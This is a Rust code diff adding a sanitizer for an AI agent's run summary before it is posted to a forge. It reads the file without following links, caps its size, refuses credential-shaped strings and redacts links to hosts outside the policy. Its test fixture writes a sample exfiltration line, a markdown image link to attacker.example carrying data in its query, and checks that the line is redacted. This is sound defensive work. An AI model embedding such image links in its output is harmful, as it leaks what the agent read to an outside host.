@@ -91,6 +91,37 @@ pub struct Args {
     /// Trusted pre-agent public-base evidence, never a file from --outputs
     #[arg(long, value_name = "FILE")]
     pub base_secret_evidence: Option<PathBuf>,
+    /// `run`'s summary.md, checked into the report for apply to post
+    #[arg(long, value_name = "FILE")]
+    pub run_summary: Option<PathBuf>,
+}
+
+/// The most of a run summary [`checked_run_summary`] keeps, in UTF-16
+/// units: below GitLab's 1,000,000-character note, with room for apply's
+/// footer and its breaking of mentions.
+const MAX_RUN_SUMMARY_UNITS: usize = 900_000;
+
+/// `run`'s summary.md at PATH as apply may post it: read without
+/// following a link, at most the size `run` writes it to for GitHub's job
+/// summary, and sanitized as the collector sanitizes a comment's body, so
+/// that a link the policy does not keep is redacted (an image URL would
+/// otherwise send what the agent read to its host from every reader's
+/// browser). One shaped like a credential, which `run` should have
+/// redacted, is refused.
+fn checked_run_summary(path: &Path, policy: &Policy) -> Result<String> {
+    let bytes = files::read_regular(path, crate::run::SUMMARY_BYTES as u64)
+        .map_err(|err| anyhow::anyhow!("{err}"))?;
+    anyhow::ensure!(
+        !redact::is_secret_shaped(&bytes),
+        "it holds a string shaped like a credential"
+    );
+    let markdown = String::from_utf8(bytes).context("it is not UTF-8")?;
+    Ok(safe_outputs::collect::sanitize::sanitize(
+        &markdown,
+        MAX_RUN_SUMMARY_UNITS,
+        false,
+        &|host| policy.keeps_link_to(host),
+    ))
 }
 
 /// What `check` decided. `--report` holds this as JSON.
@@ -124,6 +155,10 @@ pub struct Verdict {
     /// reports it so and succeeds.
     #[serde(skip_serializing_if = "std::ops::Not::not")]
     pub blocked: bool,
+    /// `run`'s summary.md from `--run-summary`, sanitized as a request's
+    /// text is, for apply to post where the forge has no job summary.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub run_summary: Option<String>,
 }
 
 impl Verdict {
@@ -146,6 +181,7 @@ impl Verdict {
             warnings: Vec::new(),
             memory: None,
             blocked: false,
+            run_summary: None,
         }
     }
 
@@ -556,6 +592,17 @@ pub fn run(args: &Args) -> Result<Exit> {
             }
         }
     }
+    // An extra: one that fails its checks is left out, and the run's
+    // requests are decided without it.
+    if let Some(path) = &args.run_summary {
+        match checked_run_summary(path, &policy) {
+            Ok(summary) => verdict.run_summary = Some(summary),
+            Err(err) => eprintln!(
+                "warning: the run summary {} is left out: {err:#}",
+                path.display()
+            ),
+        }
+    }
     if let Some(report) = &args.report {
         let json = serde_json::to_string_pretty(&verdict).context("writing the verdict")?;
         std::fs::write(report, json + "\n")
@@ -626,6 +673,46 @@ mod tests {
             )
             .is_empty()
         );
+    }
+
+    /// A run summary is sanitized as a comment's body, links to hosts the
+    /// policy does not keep redacted; one that is a link, larger than the
+    /// job summary, not text or shaped like a credential is left out.
+    #[test]
+    fn checks_the_run_summary() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("summary.md");
+        std::fs::write(
+            &path,
+            "## Agent run\n\n![x](https://attacker.example/p?d=abc) <!-- hidden -->\n",
+        )
+        .unwrap();
+        let summary = checked_run_summary(&path, &policy()).unwrap();
+        assert!(summary.starts_with("## Agent run"), "{summary}");
+        assert!(!summary.contains("d=abc"), "{summary}");
+        assert!(summary.contains("attacker.example/redacted"), "{summary}");
+        assert!(!summary.contains("hidden"), "{summary}");
+
+        // Built here, so that no credential-shaped string is in the source.
+        let token = format!("gh{}_{}", "p", "A1b2C3d4".repeat(5));
+        let link = dir.path().join("link.md");
+        symlink(&path, &link).unwrap();
+        let cases: [(&str, &Path, Option<Vec<u8>>); 4] = [
+            ("a link", &link, None),
+            (
+                "too large",
+                &path,
+                Some(vec![b'x'; crate::run::SUMMARY_BYTES + 1]),
+            ),
+            ("not text", &path, Some(vec![0xff, b'\n'])),
+            ("a credential", &path, Some(format!("t {token}\n").into())),
+        ];
+        for (name, read, content) in cases {
+            if let Some(content) = content {
+                std::fs::write(&path, content).unwrap();
+            }
+            assert!(checked_run_summary(read, &policy()).is_err(), "{name}");
+        }
     }
 
     #[test]
